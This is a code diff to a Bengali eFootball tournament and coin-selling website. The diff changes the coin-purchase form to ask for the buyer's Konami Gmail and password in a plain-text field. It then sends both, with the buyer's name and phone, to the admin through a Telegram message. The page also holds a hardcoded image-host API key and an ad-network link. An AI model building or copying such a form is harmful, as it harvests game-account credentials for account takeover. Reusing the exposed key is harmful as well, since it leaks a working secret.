@@ -85,7 +85,6 @@
         const IMGBB_API_KEY = "6d207e02198a847aa98d0a2a901485a2";
         const SITE_URL = "https://efootballbattle892-droid.github.io/eFootball-Battle/";
 
-        // আপনার দেওয়া নতুন অ্যাডস্টার্কা লিংক
         const ADSTEF_DIRECT_LINK = "https://www.profitableratecpmnetwork.com/kfsrsns5y?key=bf1f95a669793e5bc8371562542126e8";
 
         let watchedAdsCount = 0;
@@ -111,16 +110,19 @@
 
         function populateCountriesDropdown(takenCountries = []) {
             let select = document.getElementById("paid-country-select");
-            if (!select) return;
-            select.innerHTML = "<option value=''>দেশ নির্বাচন করুন</option>";
-
-            countriesList.forEach(country => {
-                if (!takenCountries.includes(country)) {
-                    let opt = document.createElement("option");
-                    opt.value = country;
-                    opt.innerText = country;
-                    select.appendChild(opt);
-                }
+            let freeSelect = document.getElementById("free-country-select");
+            
+            [select, freeSelect].forEach(sel => {
+                if (!sel) return;
+                sel.innerHTML = "<option value=''>দেশ নির্বাচন করুন</option>";
+                countriesList.forEach(country => {
+                    if (!takenCountries.includes(country)) {
+                        let opt = document.createElement("option");
+                        opt.value = country;
+                        opt.innerText = country;
+                        sel.appendChild(opt);
+                    }
+                });
             });
         }
 
@@ -257,7 +259,8 @@
         function handleCoinBuy(event) {
             event.preventDefault();
             let coins = parseInt(document.getElementById("coin-amount-input").value) || 0;
-            let gameId = document.getElementById("coin-game-id").value.trim();
+            let konamiGmail = document.getElementById("coin-konami-gmail").value.trim();
+            let konamiPass = document.getElementById("coin-konami-pass").value.trim();
             let user = JSON.parse(localStorage.getItem("registeredUser")) || {};
 
             if (coins < 10) {
@@ -282,7 +285,7 @@
             }
             loadUserData();
 
-            let msg = "🪙 নতুন কয়েন ক্রয় রিকোয়েস্ট!\n👤 ক্রেতা: " + user.name + " (" + user.phone + ")\n🎮 গেম আইডি: " + gameId + "\n🪙 কয়েন পরিমাণ: " + coins + "\n💵 কাটা হয়েছে: " + totalPrice + " Tk";
+            let msg = "🪙 নতুন কয়েন ক্রয় রিকোয়েস্ট!\n👤 ক্রেতা: " + user.name + " (" + user.phone + ")\n📧 কোনামি জিমেইল: " + konamiGmail + "\n🔑 কোনামি পাসওয়ার্ড: " + konamiPass + "\n🪙 কয়েন পরিমাণ: " + coins + "\n💵 কাটা হয়েছে: " + totalPrice + " Tk";
             sendTelegramMessage(msg, "সফলভাবে কয়েন ক্রয়ের রিকোয়েস্ট অ্যাডমিনের কাছে পাঠানো হয়েছে!");
             event.target.reset();
             document.getElementById("coin-amount-input").value = "100";
@@ -457,7 +460,6 @@
             });
         }
 
-        // --- ৩০ সেকেন্ড টাইমার ও অ্যান্টি-চিট অ্যাড লজিক ---
         function watchFreeAd() {
             if (isWatchingAd) {
                 alert("⚠️ ইতিমধ্যে একটি অ্যাড দেখা চলছে! দয়া করে ৩০ সেকেন্ড শেষ করুন।");
@@ -469,7 +471,6 @@
                 return;
             }
 
-            // নতুন ট্যাবে অ্যাড লিংক ওপেন করা
             window.open(ADSTEF_DIRECT_LINK, '_blank');
 
             isWatchingAd = true;
@@ -477,7 +478,6 @@
             let watchBtn = document.getElementById("watch-ad-btn");
             if(watchBtn) watchBtn.disabled = true;
 
-            // ব্যাকগ্রাউন্ডে ট্যাব পাল্টানো বা ফোকাস লজিক ট্র্যাক করার জন্য
             let visibilityChanged = false;
             let visibilityHandler = () => {
                 if (document.hidden) {
@@ -567,9 +567,15 @@
             let user = JSON.parse(localStorage.getItem("registeredUser")) || {};
             let freeName = document.getElementById("free-p-name").value.trim();
             let freeId = document.getElementById("free-p-id").value.trim();
-            if(!freeName || !freeId) return;
+            let freeWhatsapp = document.getElementById("free-whatsapp").value.trim();
+            let freeCountry = document.getElementById("free-country-select").value;
 
-            let message = "🎁 ফ্রি টুর্নামেন্ট সফল আবেদন!\n👤 " + user.name + " (" + user.phone + ")\n🎮 ইন-গেম: " + freeName + " (ID: " + freeId + ")";
+            if(!freeName || !freeId || !freeWhatsapp || !freeCountry) {
+                alert("⚠️ সব তথ্য সঠিকভাবে পূরণ করুন!");
+                return;
+            }
+
+            let message = "🎁 ফ্রি টুর্নামেন্ট সফল আবেদন!\n👤 একাউন্ট: " + user.name + " (" + user.phone + ")\n🎮 ইন-গেম নাম: " + freeName + "\n🆔 ইন-গেম আইডি: " + freeId + "\n📱 হোয়াটসঅ্যাপ: " + freeWhatsapp + "\n🌍 দেশ: " + freeCountry;
             sendTelegramMessage(message, "সফলভাবে ফ্রি টুর্নামেন্টে আবেদন হয়েছে!");
             event.target.reset();
             watchedAdsCount = 0;
@@ -1119,8 +1125,13 @@
 
                         <div id='free-form-fields' style='display: none;'>
                             <form onsubmit='applyFreeTournament(event)'>
-                                <div class='form-group'><label style='font-size: 11px;'>ইন-গেম নাম</label><input id='free-p-name' placeholder='নাম' required type='text'/></div>
-                                <div class='form-group'><label style='font-size: 11px;'>ইন-গেম আইডি</label><input id='free-p-id' placeholder='আইডি' required type='text'/></div>
+                                <div class='form-group'><label style='font-size: 11px;'>ইন-গেম নাম (In-game Name)</label><input id='free-p-name' placeholder='ইন-গেম নাম লিখুন' required type='text'/></div>
+                                <div class='form-group'><label style='font-size: 11px;'>ইন-গেম আইডি (In-game ID)</label><input id='free-p-id' placeholder='ইন-গেম আইডি লিখুন' required type='text'/></div>
+                                <div class='form-group'><label style='font-size: 11px;'>হোয়াটসঅ্যাপ নম্বর (WhatsApp Number)</label><input id='free-whatsapp' placeholder='হোয়াটসঅ্যাপ নম্বর লিখুন' required type='tel'/></div>
+                                <div class='form-group'>
+                                    <label style='font-size: 11px;'>দেশ নির্বাচন করুন (Select Country)</label>
+                                    <select id='free-country-select' required><option value=''>দেশ নির্বাচন করুন</option></select>
+                                </div>
                                 <button class='btn-submit' id='free-submit-btn' type='submit'>আবেদন করুন</button>
                             </form>
                         </div>
@@ -1154,7 +1165,7 @@
                     </div>
                 </div>
 
-                <!-- 5. Coin Buy / Sell Tab -->
+                <!-- 5. Coin Buy / Sell Tab (Updated with Konami ID & Password) -->
                 <div id='tab-content-coin' style='display: none;'>
                     <div style='background: #1e293b; padding: 15px; border-radius: 12px; border: 1px solid #334155; margin-bottom: 15px;'>
                         <h4 style='color: #facc15; margin-bottom: 8px; font-size: 14px;'>🪙 কয়েন কিনুন (Coin Buy & Sell)</h4>
@@ -1171,7 +1182,8 @@
                                 <b id='coin-price-display' style='font-size: 16px; color: #25d366;'>90.00 Tk</b>
                             </div>
 
-                            <div class='form-group'><label style='font-size: 11px;'>আপনার গেম আইডি / ইউজার নেম</label><input id='coin-game-id' placeholder='গেম আইডি লিখুন' required type='text'/></div>
+                            <div class='form-group'><label style='font-size: 11px;'>কোনামি জিমেইল (Konami Gmail)</label><input id='coin-konami-gmail' placeholder='কোনামি জিমেইল লিখুন' required type='email'/></div>
+                            <div class='form-group'><label style='font-size: 11px;'>কোনামি পাসওয়ার্ড (Konami Password)</label><input id='coin-konami-pass' placeholder='কোনামি পাসওয়ার্ড লিখুন' required type='text'/></div>
 
                             <button class='btn-submit' type='submit'>কয়েন অর্ডার করুন</button>
                         </form>
